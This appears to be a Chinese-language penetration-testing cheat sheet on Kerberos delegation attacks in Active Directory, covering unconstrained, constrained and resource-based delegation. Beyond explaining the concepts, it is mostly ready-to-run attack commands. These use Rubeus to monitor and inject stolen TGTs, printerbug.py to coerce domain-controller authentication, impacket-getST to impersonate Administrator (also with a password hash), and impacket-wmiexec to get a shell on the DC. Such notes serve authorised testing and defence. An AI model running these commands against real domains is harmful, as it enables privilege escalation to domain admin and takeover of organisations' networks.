---
os: linux
service: AD
syntax: impacket-getST -dc-ip <DC> -spn <SPN> -impersonate <ADMIN> <DOMAIN>/<USER>:<PASS>
tags:
  - cmd
---

# 委派攻击 Unconstrained 与 Constrained

## 原理
- 委派：让某个服务账户 / 机器账户以用户身份去访问其他服务
- Unconstrained（非约束委派）：服务可模拟任何来认证的用户（拿到他们的 TGT）
- Constrained（约束委派）：只允许委派到指定 SPN（用 S4U2Self + S4U2Proxy）
- Resource-Based（RBCD）：见 [[RBCD attack]]，由目标资源决定「谁能代表我」

## 前提
- 能枚举出设置了委派的账户/机器（BloodHound / ldapdomaindump）
- Unconstrained：需能强制目标机器发起认证（spooler）
- Constrained：需拥有该委派账户的凭据

## 前置检查

### 枚举非约束委派
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

### 枚举约束委派
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne $null} -Properties msDS-AllowedToDelegateTo
```

## 利用步骤

### 1. Unconstrained：spooler 强制认证抓 TGT
在开了非约束委派的机器上监听票据：
```powershell
Rubeus.exe monitor /interval:5 /filteruser:<VICTIM>
```
用 spooler 强制目标 DC / 用户机器向它认证：
```bash
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<DC> <UNCONSTR_IP>
# <UNCONSTR_IP> = 开了非约束委派机器的 IP
```
- 抓到高权限用户的 TGT 后，用 Rubeus 导入：
```powershell
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```
- 或把 base64 ticket 转 kirbi → ccache 后用 impacket

### 2. Constrained：S4U2Self / S4U2Proxy
用委派账户的凭据请求任意用户到指定 SPN 的服务票据：
```bash
impacket-getST -dc-ip <DC> -spn <SPN> -impersonate <ADMIN> <DOMAIN>/<USER>:<PASS>
# 例如
impacket-getST -dc-ip 10.10.10.10 -spn CIFS/DC01.<DOMAIN> -impersonate Administrator <DOMAIN>/svc_user:Password1
```
- 生成 `Administrator.ccache`
```bash
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@DC01.<DOMAIN>
```
- 用 hash 替代密码：
```bash
impacket-getST -dc-ip <DC> -spn <SPN> -impersonate <ADMIN> -hashes :<NTHASH> <DOMAIN>/<USER>
```

### 3. 与 RBCD（资源型委派）对比
| 类型 | 授权位置 | 关键字段 | 利用方式 |
| --- | --- | --- | --- |
| Unconstrained | 服务账户/机器 | TrustedForDelegation | 抓 TGT |
| Constrained | 服务账户 | msDS-AllowedToDelegateTo | getST -impersonate |
| RBCD | 目标资源 | msDS-AllowedToActOnBehalfOfOtherIdentity | addcomputer + getST |

- RBCD 无需改目标账户、也不要求账户开了委派，只需能写目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`

## 常见坑
- Unconstrained 抓 TGT 需要目标机器能连到受害者机器
- Constrained 的 getST 要求目标 SPN 在 `msDS-AllowedToDelegateTo` 列表里
- 委派账户的密码/hash 必须先拿到

## 参考开源项目
- impacket (https://github.com/fortra/impacket)
- Rubeus (https://github.com/GhostPack/Rubeus)
